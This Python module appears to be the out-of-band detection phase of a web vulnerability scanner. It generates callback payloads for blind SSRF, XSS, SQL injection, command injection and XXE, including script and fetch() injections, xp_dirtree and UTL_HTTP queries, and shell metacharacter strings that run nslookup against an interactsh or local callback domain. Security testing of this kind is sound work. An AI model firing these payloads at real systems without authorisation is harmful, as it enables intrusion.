"""
Quantara OAST — Out-of-Band Attack & Blind Detection
======================================================

Phase 5 of the Quantara enterprise scanner pipeline.

Detects vulnerabilities that produce no visible response (blind vulnerabilities):
  - Blind SSRF (server-side request forgery to external callback)
  - Blind XSS (JavaScript payload that exfiltrates to external endpoint)
  - Blind SQL Injection (time-based + DNS-based)
  - Blind Command Injection (DNS callback on command execution)
  - Blind XXE (external entity DNS resolution)
  - Email header injection (mail to external domain)

Architecture:
  QuantaraOAST — main OAST orchestrator
      ├─ InteractshClient — client for ProjectDiscovery's interactsh service
      ├─ LocalOASTServer — minimal local HTTP listener (fallback)
      ├─ OASTPayloadGenerator — generates unique per-test payloads
      └─ CallbackCorrelator — correlates callbacks to scan tests

  OASTResult — callback received from target
  OASTTest — registered test waiting for callback

Interaction modes:
  1. interactsh: Use ProjectDiscovery's hosted interactsh service (recommended)
  2. local: Spin up a lightweight local HTTP server (useful for internal targets)
  3. dns: DNS-based callback (requires DNS resolver + interactsh)
  4. custom: User-provided OAST endpoint URL
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import re
import secrets
import socket
import threading
import time
import uuid
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Any, Callable, Optional

logger = logging.getLogger("owasp_scanner.quantara_oast")

# ─────────────────────────────────────────────────────────────────────────────
# Constants
# ─────────────────────────────────────────────────────────────────────────────

# Default interactsh public server (ProjectDiscovery hosted)
DEFAULT_INTERACTSH_SERVER = "oast.pro"
DEFAULT_INTERACTSH_API = "https://oast.pro"

# Local OAST server defaults
DEFAULT_LOCAL_HOST = "0.0.0.0"
DEFAULT_LOCAL_PORT = 8765

# Polling interval for interactsh callbacks
POLL_INTERVAL_SECONDS = 3.0
POLL_TIMEOUT_SECONDS = 60.0


# ─────────────────────────────────────────────────────────────────────────────
# Data Models
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class OASTTest:
    """A registered OAST test waiting for a callback."""
    test_id: str                   # unique 8-char hex ID
    payload_url: str               # the URL injected into the payload (e.g. https://abc123.oast.pro)
    payload_domain: str            # just the domain part (abc123.oast.pro)
    scan_url: str                  # the URL being tested
    vuln_type: str                 # ssrf / xss / sqli / cmdi / xxe
    parameter: str = ""            # which parameter was injected
    payload_used: str = ""         # the full payload string injected
    created_at: float = field(default_factory=time.time)
    received_callback: bool = False


@dataclass
class OASTCallback:
    """A callback received from the OAST infrastructure."""
    test_id: str
    callback_type: str             # "http" | "dns" | "smtp"
    remote_addr: str               # caller's IP address
    request_data: str              # HTTP request / DNS query raw
    received_at: float = field(default_factory=time.time)
    protocol: str = "http"
    headers: dict[str, str] = field(default_factory=dict)
    path: str = ""
    user_agent: str = ""


@dataclass
class OASTResult:
    """A confirmed OAST-based vulnerability finding."""
    test: OASTTest
    callback: OASTCallback
    severity: str
    title: str
    description: str
    cwe: str
    owasp: str
    evidence: str
    confidence: float = 0.95      # OAST = very high confidence (callback = definitive proof)


# ─────────────────────────────────────────────────────────────────────────────
# Payload Generator
# ─────────────────────────────────────────────────────────────────────────────

class OASTPayloadGenerator:
    """
    Generates unique out-of-band payloads for each scan test.
    Each payload embeds a unique test_id for callback correlation.
    """

    def __init__(self, oast_domain: str):
        """
        oast_domain: the OAST callback domain (e.g. "abc123.oast.pro")
        The full callback URL will be https://{test_id}.{oast_domain}
        """
        self.oast_domain = oast_domain

    def generate_test_id(self) -> str:
        return secrets.token_hex(6)  # 12-char hex

    def get_callback_url(self, test_id: str) -> str:
        return f"https://{test_id}.{self.oast_domain}"

    def get_callback_domain(self, test_id: str) -> str:
        return f"{test_id}.{self.oast_domain}"

    def ssrf_payloads(self, test_id: str) -> list[dict]:
        """SSRF payload variants."""
        cb_url = self.get_callback_url(test_id)
        cb_domain = self.get_callback_domain(test_id)
        return [
            {"payload": cb_url, "type": "url", "description": "Direct OAST URL injection"},
            {"payload": f"http://{cb_domain}", "type": "http_url", "description": "HTTP OAST URL"},
            {"payload": cb_domain, "type": "domain", "description": "Domain-only OAST injection"},
            {"payload": f"///{cb_domain}", "type": "proto_relative", "description": "Protocol-relative URL"},
            {"payload": f"http://[::ffff:{cb_domain}]", "type": "ipv6_bypass", "description": "IPv6 bypass"},
        ]

    def blind_xss_payloads(self, test_id: str) -> list[dict]:
        """Blind XSS payloads that exfiltrate to OAST."""
        cb_url = self.get_callback_url(test_id)
        return [
            {
                "payload": f'"><script src="{cb_url}"></script>',
                "type": "script_src",
                "description": "Blind XSS via script src",
            },
            {
                "payload": f"'><img src=x onerror=fetch('{cb_url}')>",
                "type": "img_onerror",
                "description": "Blind XSS via img onerror",
            },
            {
                "payload": f'"><svg onload="fetch(\'{cb_url}\')">',
                "type": "svg_onload",
                "description": "Blind XSS via SVG onload",
            },
            {
                "payload": f"javascript:fetch('{cb_url}')",
                "type": "javascript_scheme",
                "description": "Blind XSS via javascript: scheme",
            },
        ]

    def sqli_dns_payloads(self, test_id: str) -> list[dict]:
        """DNS-based blind SQLi payloads (MSSQL, MySQL, Oracle)."""
        cb_domain = self.get_callback_domain(test_id)
        return [
            # MSSQL
            {
                "payload": f"'; EXEC master.dbo.xp_dirtree '\\\\{cb_domain}\\share'; --",
                "type": "mssql_dirtree",
                "description": "MSSQL xp_dirtree DNS exfiltration",
            },
            # MySQL (requires file privileges)
            {
                "payload": f"' UNION SELECT LOAD_FILE('{cb_domain}') -- ",
                "type": "mysql_load_file",
                "description": "MySQL LOAD_FILE DNS exfiltration",
            },
            # Oracle
            {
                "payload": f"' UNION SELECT UTL_HTTP.REQUEST('http://{cb_domain}') FROM dual -- ",
                "type": "oracle_utl_http",
                "description": "Oracle UTL_HTTP DNS exfiltration",
            },
        ]

    def cmdi_dns_payloads(self, test_id: str) -> list[dict]:
        """DNS-based blind command injection payloads."""
        cb_domain = self.get_callback_domain(test_id)
        return [
            {
                "payload": f"`nslookup {cb_domain}`",
                "type": "nslookup_backtick",
                "description": "Command injection via nslookup (backtick)",
            },
            {
                "payload": f"$(nslookup {cb_domain})",
                "type": "nslookup_subshell",
                "description": "Command injection via nslookup (subshell)",
            },
            {
                "payload": f"; nslookup {cb_domain} ;",
                "type": "nslookup_semicolon",
                "description": "Command injection via nslookup (semicolon)",
            },
            {
                "payload": f"| nslookup {cb_domain}",
                "type": "nslookup_pipe",
                "description": "Command injection via nslookup (pipe)",
            },
            {
                "payload": f"\r\nnslookup {cb_domain}",
                "type": "nslookup_crlf",
                "description": "CRLF + command injection via nslookup",
            },
        ]

    def xxe_payloads(self, test_id: str) -> list[dict]:
        """XXE payloads that trigger DNS/HTTP resolution."""
        cb_url = self.get_callback_url(test_id)
        return [
            {
                "payload": (
                    f'<?xml version="1.0"?><!DOCTYPE foo ['
                    f'<!ENTITY xxe SYSTEM "{cb_url}">]><foo>&xxe;</foo>'
                ),
                "type": "xxe_system",
                "description": "XXE via SYSTEM entity HTTP callback",
            },
            {
                "payload": (
                    f'<?xml version="1.0"?><!DOCTYPE foo ['
                    f'<!ENTITY % xxe SYSTEM "{cb_url}">'
                    f'%xxe;]><foo>test</foo>'
                ),
                "type": "xxe_parameter",
                "description": "XXE via parameter entity HTTP callback",
            },
        ]


# ─────────────────────────────────────────────────────────────────────────────
# Local OAST HTTP Server (fallback)
# ─────────────────────────────────────────────────────────────────────────────

class _OASTRequestHandler(BaseHTTPRequestHandler):
    """HTTP request handler for the local OAST server."""

    _callbacks: list[dict] = []

    def do_GET(self):
        self._record("GET")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"")

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8", errors="replace") if content_length > 0 else ""
        self._record("POST", body)
        self.send_response(200)
        self.end_headers()

    def _record(self, method: str, body: str = ""):
        callback = {
            "method": method,
            "path": self.path,
            "headers": dict(self.headers),
            "body": body,
            "remote_addr": self.client_address[0],
            "received_at": time.time(),
        }
        _OASTRequestHandler._callbacks.append(callback)
        logger.info(f"[oast-server] Callback received: {method} {self.path} from {self.client_address[0]}")

    def log_message(self, format, *args):
        pass  # Suppress default access logs


class LocalOASTServer:
    """
    Lightweight local HTTP server for OAST callbacks.
    Runs in a background thread.
    Used when interactsh is not available or for internal network targets.
    """

    def __init__(self, host: str = DEFAULT_LOCAL_HOST, port: int = DEFAULT_LOCAL_PORT):
        self.host = host
        self.port = port
        self._server: Optional[HTTPServer] = None
        self._thread: Optional[threading.Thread] = None
        self._running = False

    @property
    def callback_url(self) -> str:
        # Determine public IP for the callback URL
        try:
            local_ip = socket.gethostbyname(socket.gethostname())
        except Exception:
            local_ip = "127.0.0.1"
        return f"http://{local_ip}:{self.port}"

    def start(self) -> None:
        if self._running:
            return
        _OASTRequestHandler._callbacks = []
        self._server = HTTPServer((self.host, self.port), _OASTRequestHandler)
        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()
        self._running = True
        logger.info(f"[oast-server] Local OAST server started on {self.host}:{self.port}")

    def stop(self) -> None:
        if self._server:
            self._server.shutdown()
            self._running = False
            logger.info("[oast-server] Local OAST server stopped")

    def get_callbacks(self, since: float = 0.0) -> list[dict]:
        return [c for c in _OASTRequestHandler._callbacks if c["received_at"] > since]

    def __enter__(self):
        self.start()
        return self

    def __exit__(self, *args):
        self.stop()


# ─────────────────────────────────────────────────────────────────────────────
# Interactsh Client
# ─────────────────────────────────────────────────────────────────────────────

class InteractshClient:
    """
    Client for ProjectDiscovery's interactsh OAST service.
    Registers a unique subdomain and polls for callbacks.

    API: https://github.com/projectdiscovery/interactsh
    """

    def __init__(self, server_url: str = DEFAULT_INTERACTSH_API):
        self.server_url = server_url.rstrip("/")
        self._session_id: Optional[str] = None
        self._correlation_id: Optional[str] = None
        self._secret_key: Optional[str] = None
        self._domain: Optional[str] = None
        self._available = False

    def register(self) -> bool:
        """Register with interactsh server. Returns True on success."""
        try:
            import requests
            import base64
            # Simple registration — try to get a correlation ID
            payload = {"public-key": "", "secret-key": secrets.token_hex(16)}
            resp = requests.post(
                f"{self.server_url}/register",
                json=payload,
                timeout=10,
            )
            if resp.status_code == 200:
                data = resp.json()
                self._correlation_id = data.get("correlation-id", "")
                self._secret_key = payload["secret-key"]
                self._domain = data.get("domain", "")
                self._available = bool(self._domain)
                if self._available:
                    logger.info(f"[oast-interactsh] Registered: domain={self._domain}")
                return self._available
        except Exception as e:
            logger.debug(f"[oast-interactsh] Registration failed: {e}")
        self._available = False
        return False

    def get_subdomain(self, test_id: str) -> str:
        """Generate a unique subdomain for a test."""
        if self._domain:
            return f"{test_id}.{self._domain}"
        return f"{test_id}.{DEFAULT_INTERACTSH_SERVER}"

    def poll(self) -> list[dict]:
        """Poll interactsh for new callbacks. Returns list of interaction dicts."""
        if not self._correlation_id:
            return []
        try:
            import requests
            resp = requests.get(
                f"{self.server_url}/poll",
                params={"id": self._correlation_id, "secret": self._secret_key},
                timeout=10,
            )
            if resp.status_code == 200:
                data = resp.json()
                return data.get("data", []) or []
        except Exception as e:
            logger.debug(f"[oast-interactsh] Poll failed: {e}")
        return []

    def deregister(self) -> None:
        """Deregister from interactsh server."""
        if not self._correlation_id:
            return
        try:
            import requests
            requests.post(
                f"{self.server_url}/deregister",
                json={"correlation-id": self._correlation_id, "secret-key": self._secret_key},
                timeout=5,
            )
            logger.info("[oast-interactsh] Deregistered")
        except Exception:
            pass

    @property
    def is_available(self) -> bool:
        return self._available


# ─────────────────────────────────────────────────────────────────────────────
# Callback Correlator
# ─────────────────────────────────────────────────────────────────────────────

class CallbackCorrelator:
    """
    Matches incoming OAST callbacks to registered scan tests.
    Uses the test_id embedded in the callback path/domain.
    """

    def __init__(self):
        self._tests: dict[str, OASTTest] = {}  # test_id → OASTTest

    def register_test(self, test: OASTTest) -> None:
        self._tests[test.test_id] = test

    def correlate(self, raw_callback: dict) -> Optional[tuple[OASTTest, OASTCallback]]:
        """
        Match a raw callback dict to a registered test.
        Returns (OASTTest, OASTCallback) or None if no match.
        """
        # Extract test_id from path, headers, or domain
        test_id = self._extract_test_id(raw_callback)
        if not test_id or test_id not in self._tests:
            return None

        test = self._tests[test_id]
        test.received_callback = True

        callback = OASTCallback(
            test_id=test_id,
            callback_type=raw_callback.get("type", "http"),
            remote_addr=raw_callback.get("remote_address", raw_callback.get("remote_addr", "")),
            request_data=json.dumps(raw_callback)[:2000],
            received_at=raw_callback.get("received_at", time.time()),
            protocol=raw_callback.get("protocol", "http"),
            headers=raw_callback.get("headers", {}),
            path=raw_callback.get("path", ""),
            user_agent=raw_callback.get("user-agent", ""),
        )

        return test, callback

    def _extract_test_id(self, raw: dict) -> Optional[str]:
        """Extract the 12-char test_id from a callback."""
        # Check path: /abc123def456 or /test/abc123def456
        path = raw.get("path", "") or raw.get("q-id", "")
        m = re.search(r"/([0-9a-f]{12})", path)
        if m:
            return m.group(1)

        # Check host/domain: abc123def456.oast.pro
        host = raw.get("unique-id", "") or raw.get("host", "") or raw.get("domain", "")
        m = re.search(r"([0-9a-f]{12})\.", host)
        if m:
            return m.group(1)

        # Check raw data for embedded test_id
        raw_str = json.dumps(raw)
        m = re.search(r"([0-9a-f]{12})", raw_str)
        if m:
            return m.group(1)

        return None

    def pending_tests(self) -> list[OASTTest]:
        return [t for t in self._tests.values() if not t.received_callback]

    def completed_tests(self) -> list[OASTTest]:
        return [t for t in self._tests.values() if t.received_callback]


# ─────────────────────────────────────────────────────────────────────────────
# Main OAST Engine
# ─────────────────────────────────────────────────────────────────────────────

class QuantaraOAST:
    """
    Main OAST orchestrator for Quantara.

    Manages the full OAST lifecycle:
      1. Initialize interactsh or local server
      2. Generate unique payloads per test
      3. Register tests for callback correlation
      4. Poll for callbacks during/after scanning
      5. Correlate callbacks to findings
      6. Generate OASTResult objects

    Usage:
        with QuantaraOAST() as oast:
            # Generate a SSRF payload for a test
            test, payload = oast.create_test(
                scan_url="https://example.com/proxy?url=",
                vuln_type="ssrf",
                parameter="url",
            )
            # Inject payload into the request... (done by scanner)
            time.sleep(10)
            results = oast.collect_results()
    """

    def __init__(
        self,
        mode: str = "auto",           # "interactsh" / "local" / "auto" / "custom"
        custom_url: Optional[str] = None,
        local_port: int = DEFAULT_LOCAL_PORT,
        poll_timeout: float = POLL_TIMEOUT_SECONDS,
        poll_interval: float = POLL_INTERVAL_SECONDS,
    ):
        self.mode = mode
        self.custom_url = custom_url
        self.local_port = local_port
        self.poll_timeout = poll_timeout
        self.poll_interval = poll_interval

        self._interactsh: Optional[InteractshClient] = None
        self._local_server: Optional[LocalOASTServer] = None
        self._payload_gen: Optional[OASTPayloadGenerator] = None
        self._correlator = CallbackCorrelator()
        self._results: list[OASTResult] = []
        self._active = False
        self._oast_domain = DEFAULT_INTERACTSH_SERVER

    # ── Lifecycle ────────────────────────────────────────────────────────────

    def start(self) -> bool:
        """Initialize OAST infrastructure. Returns True if ready."""
        if self.mode in ("interactsh", "auto"):
            self._interactsh = InteractshClient()
            if self._interactsh.register():
                self._oast_domain = self._interactsh.get_subdomain("probe").split(".", 1)[1]
                logger.info(f"[oast] Using interactsh: domain={self._oast_domain}")
                self._payload_gen = OASTPayloadGenerator(self._oast_domain)
                self._active = True
                return True
            elif self.mode == "interactsh":
                logger.warning("[oast] interactsh registration failed")
                return False
            # Fall through to local mode
            logger.info("[oast] interactsh unavailable, falling back to local server")

        if self.mode in ("local", "auto"):
            try:
                self._local_server = LocalOASTServer(port=self.local_port)
                self._local_server.start()
                self._oast_domain = f"localhost:{self.local_port}"
                self._payload_gen = OASTPayloadGenerator(self._oast_domain)
                self._active = True
                logger.info(f"[oast] Local OAST server started on port {self.local_port}")
                return True
            except Exception as e:
                logger.warning(f"[oast] Local server failed to start: {e}")

        if self.mode == "custom" and self.custom_url:
            parsed_domain = self.custom_url.split("//")[-1].rstrip("/")
            self._oast_domain = parsed_domain
            self._payload_gen = OASTPayloadGenerator(parsed_domain)
            self._active = True
            logger.info(f"[oast] Using custom OAST endpoint: {self.custom_url}")
            return True

        # Fallback: use placeholder (won't receive callbacks but won't crash)
        self._oast_domain = DEFAULT_INTERACTSH_SERVER
        self._payload_gen = OASTPayloadGenerator(self._oast_domain)
        self._active = False
        logger.warning("[oast] No OAST infrastructure available — using placeholder domain (blind results won't be confirmed)")
        return False

    def stop(self) -> None:
        """Clean up OAST infrastructure."""
        if self._interactsh:
            self._interactsh.deregister()
        if self._local_server:
            self._local_server.stop()
        self._active = False

    def __enter__(self):
        self.start()
        return self

    def __exit__(self, *args):
        self.stop()

    # ── Test Registration ────────────────────────────────────────────────────

    def create_test(
        self,
        scan_url: str,
        vuln_type: str,
        parameter: str = "",
    ) -> tuple[OASTTest, list[dict]]:
        """
        Create and register an OAST test.
        Returns (OASTTest, list_of_payloads).
        Each payload dict has: {"payload": str, "type": str, "description": str}
        """
        if not self._payload_gen:
            raise RuntimeError("OAST not initialized — call start() first")

        test_id = self._payload_gen.generate_test_id()
        cb_url = self._payload_gen.get_callback_url(test_id)
        cb_domain = self._payload_gen.get_callback_domain(test_id)

        test = OASTTest(
            test_id=test_id,
            payload_url=cb_url,
            payload_domain=cb_domain,
            scan_url=scan_url,
            vuln_type=vuln_type,
            parameter=parameter,
        )
        self._correlator.register_test(test)

        # Generate appropriate payloads for the vuln type
        payloads = self._generate_payloads(test_id, vuln_type)
        logger.debug(f"[oast] Test {test_id} created for {vuln_type} @ {scan_url}")

        return test, payloads

    def _generate_payloads(self, test_id: str, vuln_type: str) -> list[dict]:
        gen = self._payload_gen
        if vuln_type == "ssrf":
            return gen.ssrf_payloads(test_id)
        elif vuln_type == "xss":
            return gen.blind_xss_payloads(test_id)
        elif vuln_type == "sqli":
            return gen.sqli_dns_payloads(test_id)
        elif vuln_type == "cmdi":
            return gen.cmdi_dns_payloads(test_id)
        elif vuln_type == "xxe":
            return gen.xxe_payloads(test_id)
        else:
            # Generic: SSRF payloads as fallback
            return gen.ssrf_payloads(test_id)

    # ── Polling ──────────────────────────────────────────────────────────────

    def poll_once(self) -> list[OASTResult]:
        """
        Poll once for callbacks and return any new confirmed findings.
        Call this periodically during/after scanning.
        """
        new_callbacks: list[dict] = []

        # Collect from interactsh
        if self._interactsh and self._interactsh.is_available:
            raw_callbacks = self._interactsh.poll()
            new_callbacks.extend(raw_callbacks)

        # Collect from local server
        if self._local_server:
            scan_start = time.time() - self.poll_timeout
            local_cbs = self._local_server.get_callbacks(since=scan_start)
            new_callbacks.extend(local_cbs)

        # Correlate callbacks to tests
        new_results = []
        for raw in new_callbacks:
            match = self._correlator.correlate(raw)
            if match:
                test, callback = match
                result = self._build_result(test, callback)
                if result:
                    self._results.append(result)
                    new_results.append(result)
                    logger.info(
                        f"[oast] CONFIRMED: {test.vuln_type} @ {test.scan_url} "
                        f"(callback from {callback.remote_addr})"
                    )

        return new_results

    def wait_for_callbacks(self, timeout: Optional[float] = None) -> list[OASTResult]:
        """
        Poll for `timeout` seconds and return all confirmed results.
        Useful at the end of a scan to wait for delayed callbacks.
        """
        timeout = timeout or self.poll_timeout
        deadline = time.time() + timeout
        all_results = []

        while time.time() < deadline:
            new = self.poll_once()
            all_results.extend(new)
            pending = self._correlator.pending_tests()
            if not pending:
                break
            time.sleep(self.poll_interval)

        return all_results

    def collect_results(self) -> list[OASTResult]:
        """Return all confirmed OAST results so far."""
        return list(self._results)

    # ── Result Building ──────────────────────────────────────────────────────

    def _build_result(self, test: OASTTest, callback: OASTCallback) -> Optional[OASTResult]:
        """Build an OASTResult from a confirmed callback."""
        vuln_meta = _VULN_METADATA.get(test.vuln_type, _VULN_METADATA["generic"])

        evidence = (
            f"OAST callback received from {callback.remote_addr} "
            f"for test_id={test.test_id}\n"
            f"Callback type: {callback.callback_type}\n"
            f"Request path: {callback.path}\n"
            f"Payload injected: {test.payload_used[:200] if test.payload_used else test.payload_url}"
        )

        return OASTResult(
            test=test,
            callback=callback,
            severity=vuln_meta["severity"],
            title=vuln_meta["title"],
            description=(
                f"{vuln_meta['description']} "
                f"Confirmed via OAST callback (test_id: {test.test_id})."
            ),
            cwe=vuln_meta["cwe"],
            owasp=vuln_meta["owasp"],
            evidence=evidence,
            confidence=0.97,  # OAST callback = definitive proof
        )

    # ── Status ───────────────────────────────────────────────────────────────

    @property
    def is_active(self) -> bool:
        return self._active

    @property
    def oast_domain(self) -> str:
        return self._oast_domain

    def get_pending_count(self) -> int:
        return len(self._correlator.pending_tests())

    def get_confirmed_count(self) -> int:
        return len(self._correlator.completed_tests())


# ─────────────────────────────────────────────────────────────────────────────
# Vulnerability Metadata
# ─────────────────────────────────────────────────────────────────────────────

_VULN_METADATA: dict[str, dict] = {
    "ssrf": {
        "title": "Blind Server-Side Request Forgery (SSRF) — OAST Confirmed",
        "description": (
            "The application made an outbound HTTP request to an attacker-controlled server. "
            "This confirms a Server-Side Request Forgery vulnerability. "
            "An attacker can use this to reach internal services, cloud metadata APIs, "
            "or exfiltrate data."
        ),
        "severity": "CRITICAL",
        "cwe": "CWE-918",
        "owasp": "A10:2021",
    },
    "xss": {
        "title": "Blind Cross-Site Scripting (XSS) — OAST Confirmed",
        "description": (
            "A JavaScript payload executed in a victim's browser and made an outbound request "
            "to an attacker-controlled server. This confirms a Blind XSS vulnerability. "
            "An attacker can steal session cookies, keylog, or take over the victim's session."
        ),
        "severity": "HIGH",
        "cwe": "CWE-79",
        "owasp": "A03:2021",
    },
    "sqli": {
        "title": "Blind SQL Injection — DNS Exfiltration Confirmed",
        "description": (
            "The database server resolved a DNS query to an attacker-controlled domain. "
            "This confirms a Blind SQL Injection vulnerability via DNS exfiltration. "
            "An attacker can exfiltrate database contents character by character."
        ),
        "severity": "CRITICAL",
        "cwe": "CWE-89",
        "owasp": "A03:2021",
    },
    "cmdi": {
        "title": "Blind Command Injection — DNS Callback Confirmed",
        "description": (
            "The server executed an injected command that triggered a DNS resolution "
            "to an attacker-controlled domain. This confirms OS Command Injection. "
            "An attacker can execute arbitrary commands on the server."
        ),
        "severity": "CRITICAL",
        "cwe": "CWE-78",
        "owasp": "A03:2021",
    },
    "xxe": {
        "title": "XML External Entity (XXE) Injection — OAST Confirmed",
        "description": (
            "The XML parser resolved an external entity to an attacker-controlled server. "
            "This confirms an XXE vulnerability. "
            "An attacker can read local files, perform SSRF, or cause DoS."
        ),
        "severity": "HIGH",
        "cwe": "CWE-611",
        "owasp": "A05:2021",
    },
    "generic": {
        "title": "Out-of-Band Interaction Detected — OAST Confirmed",
        "description": (
            "An out-of-band interaction was detected to an attacker-controlled server. "
            "This may indicate a blind injection vulnerability."
        ),
        "severity": "HIGH",
        "cwe": "CWE-74",
        "owasp": "A03:2021",
    },
}


# ─────────────────────────────────────────────────────────────────────────────
# Public API
# ─────────────────────────────────────────────────────────────────────────────

def create_oast_engine(
    mode: str = "auto",
    custom_url: Optional[str] = None,
    local_port: int = DEFAULT_LOCAL_PORT,
) -> QuantaraOAST:
    """Factory: create a configured QuantaraOAST instance."""
    return QuantaraOAST(mode=mode, custom_url=custom_url, local_port=local_port)


def oast_result_to_finding(result: OASTResult) -> dict:
    """Convert an OASTResult to a finding dict compatible with normalize_finding()."""
    return {
        "id": f"OAST-{result.test.test_id}",
        "file": result.test.scan_url,
        "line_number": 0,
        "severity": result.severity.lower(),
        "title": result.title,
        "description": result.description,
        "matched_content": result.evidence[:500],
        "category": "oast",
        "cwe": result.cwe,
        "remediation": _get_remediation(result.test.vuln_type),
        "confidence": result.confidence,
        "module": "quantara_http",
        "module_name": "Quantara OAST",
        "owasp": result.owasp,
        "tags": ["oast", "blind", result.test.vuln_type, "confirmed"],
        "finding_type": f"blind-{result.test.vuln_type}",
        "scanner_source": "quantara",
    }


def _get_remediation(vuln_type: str) -> str:
    remediations = {
        "ssrf": "Implement allowlist for outbound requests. Validate and sanitize all user-supplied URLs. Block internal IP ranges.",
        "xss": "Implement Content Security Policy (CSP). Encode all user output. Use HttpOnly and Secure cookie flags.",
        "sqli": "Use parameterized queries / prepared statements. Never concatenate user input into SQL.",
        "cmdi": "Avoid shell execution with user input. Use language-native APIs instead of shell commands. Validate inputs strictly.",
        "xxe": "Disable external entity processing in XML parsers. Use safe XML parsing libraries.",
        "generic": "Validate and sanitize all user inputs. Implement output encoding. Follow defense-in-depth principles.",
    }
    return remediations.get(vuln_type, remediations["generic"])
